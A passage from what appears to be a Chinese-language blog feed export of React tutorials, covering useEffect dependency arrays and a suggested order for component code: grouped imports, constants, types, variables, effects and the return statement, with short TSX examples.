&#123;</span><br><span class="line">  <span class="keyword">const</span> counter = <span class="title function_">useRef</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">onClickCounter</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    counter.<span class="property">current</span>++;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">onClickCounterRequest</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">    <span class="title function_">apiCall</span>(counter.<span class="property">current</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;onClickCounter&#125;</span>&gt;</span>Counter<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;onClickCounterRequest&#125;</span>&gt;</span>Counter Request<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="E8IPf"></a></p><h2 id="6-不要缺少-useEffect-依赖"><a href="#6-不要缺少-useEffect-依赖" class="headerlink" title="6. 不要缺少 useEffect 依赖"></a>6. 不要缺少 useEffect 依赖</h2><p><code>useEffect</code>是 React Hooks 中最常用的 Hook 之一。默认情况下，它总是在每次重新渲染时运行。但这样就可能会导致不必要的渲染。我们可以通过给 useEffect 设置依赖数组来避免这些不必要的渲染。</p><p>来看下面的例子：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Counter</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">showCount</span> = (<span class="params">count</span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Count&quot;</span>, count);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">showCount</span>(count);</span><br><span class="line">  &#125;, []);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Counter: &#123;count&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />这个组件可能没有什么实际的意义，只是打印了 count 的值。这时就会有一个警告：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1637776033827-502840e4-5379-4735-8537-9e4f2a213896.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/png/1500604/1637776033827-502840e4-5379-4735-8537-9e4f2a213896.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>这里是说，useEffect 缺少一个 count 依赖，这样是不安全的。我们需要包含一个依赖项或者移除依赖数组。否则 useEffect 中的代码可能会使用旧的值。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title function_">Counter</span> = (<span class="params"></span>) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> [count, setCount] = <span class="title function_">useState</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="title function_">showCount</span> = (<span class="params">count</span>) =&gt; &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Count&quot;</span>, count);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">showCount</span>(count);</span><br><span class="line">  &#125;, [count]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>Counter: &#123;count&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果 useEffect 中没有用到状态变量 count，那么依赖项为空也会是安全的：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">showCount</span>(<span class="number">996</span>);</span><br><span class="line">&#125;, []);</span><br></pre></td></tr></table></figure><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 组件代码结构如何组织？</title>
      <link href="/2023/08/23/frontend/react/react-zu-jian-dai-ma-jie-gou-ru-he-zu-zhi/"/>
      <url>/2023/08/23/frontend/react/react-zu-jian-dai-ma-jie-gou-ru-he-zu-zhi/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="MZPZO"></a></p><h2 id="1-导入依赖项"><a href="#1-导入依赖项" class="headerlink" title="1. 导入依赖项"></a>1. 导入依赖项</h2><p>我们需要在组件文件顶部导入组件所需的依赖项，通常是使用 import 来进行导入。对于不同类别的依赖项，建议对它们进行分组，这有助于帮助我们更好的理解组件。可以将导入的依赖分为四类：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 外部依赖</span></span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span> <span class="keyword">from</span> <span class="string">&quot;react&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; useRouter &#125; <span class="keyword">from</span> <span class="string">&quot;next/router&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 内部依赖</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Button</span> &#125; <span class="keyword">from</span> <span class="string">&quot;../src/components/button&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 本地依赖</span></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Tag</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./tag&quot;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Subscribe</span> &#125; <span class="keyword">from</span> <span class="string">&quot;./subscribe&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 样式</span></span><br><span class="line"><span class="keyword">import</span> styles <span class="keyword">from</span> <span class="string">&quot;./article.module.scss&quot;</span>;</span><br></pre></td></tr></table></figure><p><br />● <strong>外部依赖：</strong>外部依赖主要是第三方依赖，这些依赖定义在<code>package.json</code>文件中并从<code>node_modules</code> 中导入；<br />● <strong>内部依赖：</strong>内部依赖主要是位于组件文件夹之外的可重用的组件或模块，这些导入都应该使用相对导入语法，以<code>../</code> 开头。通常，大部分导入的依赖项都属于这一类。因此，如果需要的话，我们可以将这一类组件进一步进行分离，例如：UI 组件、数据相关的导入、services 等；<br />● <strong>本地依赖：</strong>本地依赖主要是与组件位于同一文件夹中的本地依赖项或子组件。这些依赖项的所有导入路径应以<code>./</code>开头。主要是比较大的组件会包含本地依赖项；<br />● <strong>样式：</strong>最后这一部分大部分时候只包含一个导入，代表样式组件。如果导入了多个样式表，则需要考虑样式的拆分是否有问题。</p><p>对导入依赖项进行手动分组对我们来说可能比较麻烦，而 Prettier 敲好可以帮助我们自动格式化代码，我们可以安装 <a href="https://github.com/trivago/prettier-plugin-sort-imports">prettier-plugin-sort-imports</a> 插件，并使用它来自动格式化依赖项导入。需要在项目根目录创建<code>prettier.config.js</code>文件，并在里面添加规则：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="comment">// 其他 Prettier 配置</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">importOrder</span>: [</span><br><span class="line">    <span class="comment">// 默认情况下，首先会放置外部依赖项</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 内部依赖</span></span><br><span class="line">    <span class="string">&quot;^../(.*)&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 本地依赖项，样式除外</span></span><br><span class="line">    <span class="string">&quot;^./((?!scss).)*$&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 其他</span></span><br><span class="line">    <span class="string">&quot;^./(.*)&quot;</span>,</span><br><span class="line">  ],</span><br><span class="line">  <span class="attr">importOrderSeparation</span>: <span class="literal">true</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><br />下面是该插件给出的例子，输入：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123;</span><br><span class="line">    <span class="variable constant_">FC</span>,</span><br><span class="line">    useEffect,</span><br><span class="line">    useRef,</span><br><span class="line">    <span class="title class_">ChangeEvent</span>,</span><br><span class="line">    <span class="title class_">KeyboardEvent</span>,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; logger &#125; <span class="keyword">from</span> <span class="string">&#x27;@core/logger&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; reduce, debounce &#125; <span class="keyword">from</span> <span class="string">&#x27;lodash&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Message</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;../Message&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createServer &#125; <span class="keyword">from</span> <span class="string">&#x27;@server/node&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Alert</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@ui/Alert&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; repeat, filter, add &#125; <span class="keyword">from</span> <span class="string">&#x27;../utils&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; initializeApp &#125; <span class="keyword">from</span> <span class="string">&#x27;@core/app&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Popup</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@ui/Popup&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createConnection &#125; <span class="keyword">from</span> <span class="string">&#x27;@server/database&#x27;</span>;</span><br></pre></td></tr></table></figure><p><br />输出：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; debounce, reduce &#125; <span class="keyword">from</span> <span class="string">&#x27;lodash&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> <span class="title class_">React</span>, &#123;</span><br><span class="line">    <span class="title class_">ChangeEvent</span>,</span><br><span class="line">    <span class="variable constant_">FC</span>,</span><br><span class="line">    <span class="title class_">KeyboardEvent</span>,</span><br><span class="line">    useEffect,</span><br><span class="line">    useRef,</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">&#x27;react&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; createConnection &#125; <span class="keyword">from</span> <span class="string">&#x27;@server/database&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createServer &#125; <span class="keyword">from</span> <span class="string">&#x27;@server/node&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; initializeApp &#125; <span class="keyword">from</span> <span class="string">&#x27;@core/app&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; logger &#125; <span class="keyword">from</span> <span class="string">&#x27;@core/logger&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Alert</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@ui/Alert&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Popup</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;@ui/Popup&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> &#123; <span class="title class_">Message</span> &#125; <span class="keyword">from</span> <span class="string">&#x27;../Message&#x27;</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; add, filter, repeat &#125; <span class="keyword">from</span> <span class="string">&#x27;../utils&#x27;</span>;</span><br></pre></td></tr></table></figure><p><br />prettier-plugin-sort-imports：<a href="https://github.com/trivago/prettier-plugin-sort-imports">https://github.com/trivago/prettier-plugin-sort-imports</a></p><p><a name="XPSI7"></a></p><h2 id="2-静态定义"><a href="#2-静态定义" class="headerlink" title="2. 静态定义"></a>2. 静态定义</h2><p>在导入完依赖项的下方，通常会定义有使用 TypeScript 或 Flow 等静态类型检查器时的文件级常量和类型定义。下面就来分别看一下每一种。</p><p><a name="Xpg9P"></a></p><h3 id="（1）常量定义"><a href="#（1）常量定义" class="headerlink" title="（1）常量定义"></a>（1）常量定义</h3><p>任何 magic 值，例如字符串或者数字，都应该放在文件的顶部，import 语句的下方。由于这些都是静态常量，这意味着它们的值不会改变。因此将它们放在组件中是没有意义的，因为放在组件中的话，它们会在每次重新渲染组件时重新创建。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">MAX_READING_TIME</span> = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">META_TITLE</span> = <span class="string">&quot;Hello World&quot;</span>;</span><br></pre></td></tr></table></figure><p>对于更复杂的静态数据结构，可以将它提取到一个单独的文件中，以保持组件的干净。</p><p><a name="ko6sw"></a></p><h3 id="（2）类型定义"><a href="#（2）类型定义" class="headerlink" title="（2）类型定义"></a>（2）类型定义</h3><p>我使用的是 TypeScript，接下来声明组件 <code>props</code> 的类型 <code>interface</code>：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Props</span> &#123;</span><br><span class="line">  <span class="attr">id</span>: <span class="built_in">number</span>;</span><br><span class="line">  <span class="attr">name</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">title</span>: <span class="built_in">string</span>;</span><br><span class="line">  <span class="attr">meta</span>: <span class="title class_">Metadata</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />如果这个 <code>props</code>的类型不需要导出，可以使用 <code>Props</code> 作为接口名称，这样可以帮助我们立即识别组件 <code>props</code> 的类型定义，并将其与其他类型区分开来。</p><p>只有当这个 <code>props</code> 需要在多个组件使用时，才会添加组件名称，例如<code>ButtonProps</code>，因为他在导入另一个组件时，不应该与本地的<code>Props</code>接口冲突。</p><p><a name="tdteG"></a></p><h2 id="3-组件定义"><a href="#3-组件定义" class="headerlink" title="3. 组件定义"></a>3. 组件定义</h2><p>定义函数组件的方式有两种：<strong>函数声明</strong>和<strong>箭头函数，</strong>我个人更喜欢使用函数声明的形式，以为这就是语法声明的内容：函数。官方文档的示例中也使用了这种方法：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Article</span>(<span class="params">props: Props</span>) &#123;</span><br><span class="line">  <span class="comment">/**/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />只会在必须使用 <code>forwardRef</code> 时使用箭头函数：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Article</span> = <span class="title class_">React</span>.<span class="property">forwardRef</span>&lt;<span class="title class_">HTMLArticleElement</span>, <span class="title class_">Props</span>&gt;(</span><br><span class="line">  <span class="function">(<span class="params">props, ref</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">/**/</span></span><br><span class="line">  &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p><br />通常会在组件最后默认导出组件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Article</span>;</span><br></pre></td></tr></table></figure><p><a name="dQXih"></a></p><h2 id="4-变量声明"><a href="#4-变量声明" class="headerlink" title="4. 变量声明"></a>4. 变量声明</h2><p>接下来，我们就需要在组件里面进行变量的声明。注意，即使使用 const 声明的这里也称为变量，因为它们的值通常在不同的渲染之间发生变化，只有在执行单个渲染过程时是恒定的。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; id, name, title &#125; = props;</span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">useRouter</span>();</span><br><span class="line"><span class="keyword">const</span> initials = <span class="title function_">getInitials</span>(name);</span><br></pre></td></tr></table></figure><p>此部分通常包含在组件级别使用的所有变量，使用 const 或 let 定义，具体取决于它们在渲染期间是否更改其值：<br />● 解构数据，通常来自 props、数据 stores 或应用程序的状态；<br />● Hooks，自定义 hooks、框架内置 Hooks，例如 useState、useReducer、useRef、useCallback 或 useMemo；<br />● 在整个组件中使用的已处理数据，由函数计算得出；</p><p>一些较大的组件可能需要在组件中声明很多变量。这种情况下，建议根据它们的初始化方法或者用途对它们进行分组：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 框架 hooks</span></span><br><span class="line"><span class="keyword">const</span> router = <span class="title function_">useRouter</span>();</span><br><span class="line"><span class="comment">// 自定义 hooks</span></span><br><span class="line"><span class="keyword">const</span> user = <span class="title function_">useLoggedUser</span>();</span><br><span class="line"><span class="keyword">const</span> theme = <span class="title function_">useTheme</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 从 props 中解构的数据</span></span><br><span class="line"><span class="keyword">const</span> &#123; id, title, meta, content, onSubscribe, tags &#125; = props;</span><br><span class="line"><span class="keyword">const</span> &#123; image, author, date &#125; = meta;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 组件状态</span></span><br><span class="line"><span class="keyword">const</span> [email, setEmail] = <span class="title class_">React</span>.<span class="title function_">useState</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> [showMenu, toggleMenu] = <span class="title class_">React</span>.<span class="title function_">useState</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="keyword">const</span> [activeTag, dispatch] = <span class="title class_">React</span>.<span class="title function_">useReducer</span>(reducer, tags);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 记忆数据</span></span><br><span class="line"><span class="keyword">const</span> subscribe = <span class="title class_">React</span>.<span class="title function_">useCallback</span>(onSubscribe, [id]);</span><br><span class="line"><span class="keyword">const</span> summary = <span class="title class_">React</span>.<span class="title function_">useMemo</span>(<span class="function">() =&gt;</span> <span class="title function_">getSummary</span>(content), [content]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// refs</span></span><br><span class="line"><span class="keyword">const</span> sideMenuRef = useRef&lt;<span class="title class_">HTMLDivElement</span>&gt;(<span class="literal">null</span>);</span><br><span class="line"><span class="keyword">const</span> subscribeRef = useRef&lt;<span class="title class_">HTMLButtonElement</span>&gt;(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算数据</span></span><br><span class="line"><span class="keyword">const</span> initials = <span class="title function_">getInitials</span>(author);</span><br><span class="line"><span class="keyword">const</span> formattedDate = <span class="title function_">getDate</span>(date);</span><br></pre></td></tr></table></figure><p><br />变量分组的方法在不同组件之间可能会存在很大的差异，它取决于变量的数量和类型。关键点是要将相关变量放在一起，在不同的组之间添加一个空行来提高代码的可读性。</p><blockquote><p>注：上面代码中的注释仅用于标注分组类型，在实际项目中不会写这些注释。</p></blockquote><br /><a name="jIJLK"></a>## 5. EffectsEffects 部分通常会写在变量声明之后，他们可能是React中最复杂的构造，但从语法的角度来看它们非常简单：<figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">setLogo</span>(theme === <span class="string">&quot;dark&quot;</span> ? <span class="string">&quot;white&quot;</span> : <span class="string">&quot;black&quot;</span>);</span><br><span class="line">&#125;, [theme]);</span><br></pre></td></tr></table></figure>任何包含在effect之内但是在其外部定义的变量，都应该包含在依赖项的数组中。<p>除此之外，还应该使用<code>return</code>来清理副作用：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">useEffect</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">onScroll</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&quot;scroll&quot;</span>, onScroll);</span><br><span class="line">  <span class="keyword">return</span> <span class="function">() =&gt;</span> <span class="variable language_">window</span>.<span class="title function_">removeEventListener</span>(<span class="string">&quot;scroll&quot;</span>, onScroll);</span><br><span class="line">&#125;, []);</span><br></pre></td></tr></table></figure><p><a name="znQbr"></a></p><h2 id="6-渲染内容"><a href="#6-渲染内容" class="headerlink" title="6. 渲染内容"></a>6. 渲染内容</h2><p>UI 组件的核心就是它的内容，此内容使用 JSX 语法定义并在浏览器中呈现为 HTML。这就是为什么我更喜欢让函数组件的的 return 语句尽可能靠近文件顶部的原因。其他一切都只是细节，所以它们应该放在文件较下的位置。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Article</span>(<span class="params">props: Props</span>) &#123;</span><br><span class="line">  <span class="comment">// 变量声明</span></span><br><span class="line">  <span class="comment">// effects</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ❌ 自定义的函数不建议放在 return 部分的前面</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getInitials</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="comment">/* content */</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Article</span>;</span><br></pre></td></tr></table></figure><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">Article</span>(<span class="params">props: Props</span>) &#123;</span><br><span class="line">  <span class="comment">// 变量声明</span></span><br><span class="line">  <span class="comment">// effects</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="comment">/* content */</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// ✅ 自定义的函数建议放在 return 部分的后面</span></span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">getInitials</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">/*...*/</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="title class_">Article</span>;</span><br></pre></td></tr></table></figure><p><br />难道<code>return</code>不应该放在函数的最后吗？其实不然，对于简单的常规函数，肯定是要将<code>return</code>放在最后的。然而，React 组件并不是简单的函数，它们通常包含具有各种用途的嵌套函数，例如事件处理程序。</p><p>最后的<code>return</code>语句，以及前面的一堆其他函数，实际上阻碍了代码的阅读，使得很难找到组件渲染的内容：<br />● 很难搜索该<code>return</code>语句，因为可能有来自其他嵌套函数的多个 <code>return</code> 语句；<br />● 在文件末尾滚动查找 <code>return</code> 语句并不能保证很容易找到它，因为返回的 JSX 块可能非常大。</p><p>当然，函数定义的位置是因人而异的，如果将函数放在<code>return</code>的下方，那么如果想要使用箭头函数来自定义函数，那就只能使用<code>var</code>来定义，因为<code>let</code>和<code>const</code>不存在变量提升，不能在定义箭头函数之前使用它。</p><p><a name="tWxvg"></a></p><h2 id="7-部分渲染"><a href="#7-部分渲染" class="headerlink" title="7. 部分渲染"></a>7. 部分渲染</h2><p>在处理大型 JSX 代码时，将某些内容块提取为单独的函数来渲染组件的一部分是很有帮助的，类似于将大型函数分解为多个较小的函数。</p><figure class="highlight 